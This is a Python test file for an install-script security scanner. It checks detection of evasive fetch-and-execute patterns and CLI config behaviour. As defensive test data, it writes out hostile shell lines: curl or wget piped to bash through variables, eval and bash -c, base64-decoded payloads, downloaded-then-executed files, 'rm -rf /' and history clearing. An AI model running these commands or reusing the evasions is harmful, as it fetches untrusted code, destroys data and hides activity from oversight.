"""v12.2.0 real-world upgrades: engine evasions + CLI conventions."""
import json
import os

import pytest

from cex_installguard.cli import main
from cex_installguard.scanner import scan_text
from cex_installguard import config as cfgmod


def ids(text):
    return {f.rule_id for f in scan_text(text)}


# --------------------------------------------------------------------------- #
# Engine: previously-missed execution evasions are now detected               #
# --------------------------------------------------------------------------- #

def test_indirect_command_name_variable():
    assert 'IG001' in ids('C=curl\n$C http://x.invalid/a | bash\n')
    assert 'IG001' in ids('D="wget"\n${D} http://x.invalid/a -O- | sh\n')


def test_env_prefix_resolution():
    assert 'IG001' in ids('env curl http://x.invalid/a | sh\n')
    assert 'IG001' in ids('FOO=1 env curl http://x.invalid/a | bash\n')
    assert 'IG001' in ids('env /usr/bin/curl http://x.invalid/a | sh\n')


def test_static_eval_body_analyzed():
    # adjacent quoted segments rebuild the command inside eval
    assert 'IG001' in ids('eval "cu""rl http://x.invalid/a | sh"\n')
    assert 'IG002' in ids('eval "rm -rf /"\n')   # recursive delete


def test_bash_dash_c_static_body():
    assert 'IG001' in ids('bash -c "curl http://x.invalid/a | sh"\n')
    assert 'IG032' in ids('B="aGF4..." \nbash -c "echo hi | base64 -d | bash"\n')


def test_heredoc_written_to_script_file():
    text = ('cat <<EOF > /tmp/x\n'
            '#!/bin/sh\n'
            'curl http://x.invalid/a | sh\n'
            'EOF\n')
    assert 'IG001' in ids(text)
    # a heredoc that is NOT written to a file (e.g. fed to a program's
    # stdin) is data, not an executed script — no false positive
    stdin_fed = ('mysql -u root <<SQL\n'
                 'SELECT * FROM curl WHERE x="http://x.invalid/a | sh";\n'
                 'SQL\n')
    assert 'IG001' not in ids(stdin_fed)


def test_taint_through_cp_mv():
    # the copied artifact keeps its downloaded origin: chmod +x → IG049,
    # and a later direct execution → IG048 (v13 lifecycle separation)
    text = ('curl -o /tmp/a http://x.invalid/x\n'
            'cp /tmp/a /tmp/b\n'
            'chmod +x /tmp/b\n')
    assert 'IG049' in ids(text)
    text2 = ('curl -o /tmp/a http://x.invalid/x\n'
             'mv /tmp/a /tmp/c\n'
             '/tmp/c\n')
    assert 'IG048' in ids(text2)


def test_embedded_body_shares_staged_state():
    # bash -c references a file staged earlier in the script
    text = ('curl -o /tmp/tool http://x.invalid/t\n'
            'bash -c "/tmp/tool --run"\n')
    assert 'IG048' in ids(text)


def test_benign_env_usage_still_clean():
    assert ids('env | grep PATH\n') == set()


# --------------------------------------------------------------------------- #
# CLI conventions: RC discovery, ignore file, NO_COLOR                        #
# --------------------------------------------------------------------------- #

def test_rc_file_discovery(tmp_path, capsys):
    (tmp_path / 'vendor').mkdir()
    (tmp_path / 'vendor' / 'danger.sh').write_text(
        'curl http://x.invalid/a | bash\n')
    (tmp_path / 'ok.sh').write_text('echo clean\n')
    (tmp_path / '.cex-installguard.json').write_text(json.dumps(
        {'ignore_paths': ['vendor']}))

    rc = main(['--no-color', '--quiet', str(tmp_path)])
    out = capsys.readouterr().out
    assert rc == 0
    assert 'vendor' not in out


def test_no_rc_disables_discovery(tmp_path, capsys):
    (tmp_path / '.cex-installguard.json').write_text(json.dumps(
        {'ignore_paths': ['*']}))
    (tmp_path / 'scanme.sh').write_text('echo hi\n')
    rc = main(['--no-color', '--quiet', '--no-rc', str(tmp_path)])
    # discovery disabled → the ignore-everything config is not applied
    # and the shell file is scanned normally
    assert rc == 0


def test_installguardignore_file(tmp_path, capsys):
    (tmp_path / 'test-data').mkdir()
    (tmp_path / 'test-data' / 'danger.sh').write_text(
        'curl http://x.invalid/a | bash\n')
    (tmp_path / 'main.sh').write_text('echo clean\n')
    (tmp_path / '.installguardignore').write_text(
        '# generated test data\ntest-data\n')

    rc = main(['--no-color', '--quiet', str(tmp_path)])
    assert rc == 0                      # test-data was skipped entirely


def test_color_flags_and_env(monkeypatch, tmp_path, capsys):
    p = tmp_path / 'x.sh'
    p.write_text('history -c\n')

    monkeypatch.delenv('NO_COLOR', raising=False)
    monkeypatch.delenv('CLICOLOR_FORCE', raising=False)
    monkeypatch.setattr(os, 'environ', os.environ.copy())

    # NO_COLOR disables ANSI
    os.environ['NO_COLOR'] = '1'
    assert not cfgmod.color_requested()
    # CLICOLOR_FORCE overrides NO_COLOR per convention? No: NO_COLOR wins
    os.environ['CLICOLOR_FORCE'] = '1'
    assert not cfgmod.color_requested('auto')
    # explicit always overrides the environment
    assert cfgmod.color_requested('always')
    del os.environ['NO_COLOR']
    assert cfgmod.color_requested('auto')          # CLICOLOR_FORCE set

    rc = main(['--color', 'never', '--quiet', str(p)])
    out = capsys.readouterr().out
    assert rc == 0 and '\x1b[' not in out


def test_exit_codes_unchanged(tmp_path, capsys):
    bad = tmp_path / 'bad.sh'
    bad.write_text('curl http://x.invalid/a | bash\n')
    assert main(['--no-color', '--quiet', str(bad)]) == 2
    good = tmp_path / 'good.sh'
    good.write_text('echo hi\n')
    assert main(['--no-color', '--quiet', str(good)]) == 0


# --------------------------------------------------------------------------- #
# Config module units                                                         #
# --------------------------------------------------------------------------- #

def test_discover_prefers_nearest_rc(tmp_path):
    child = tmp_path / 'a' / 'b'
    child.mkdir(parents=True)
    (tmp_path / '.cex-installguard.json').write_text('{"workers": 2}')
    cfg, path = cfgmod.discover(str(child))
    assert path == str(tmp_path / '.cex-installguard.json')
    assert cfg['workers'] == 2


def test_discover_invalid_json_skipped(tmp_path):
    (tmp_path / '.cex-installguard.json').write_text('{ not json')
    cfg, path = cfgmod.discover(str(tmp_path))
    assert path is None                        # broken file is ignored


def test_load_ignore_file_patterns(tmp_path):
    (tmp_path / '.installguardignore').write_text(
        'node_modules\n# comment\n\nvendor\n')
    assert cfgmod.load_ignore_file(str(tmp_path)) == ['node_modules',
                                                      'vendor']
    empty = tmp_path / 'empty'
    empty.mkdir()
    assert cfgmod.load_ignore_file(str(empty)) == []
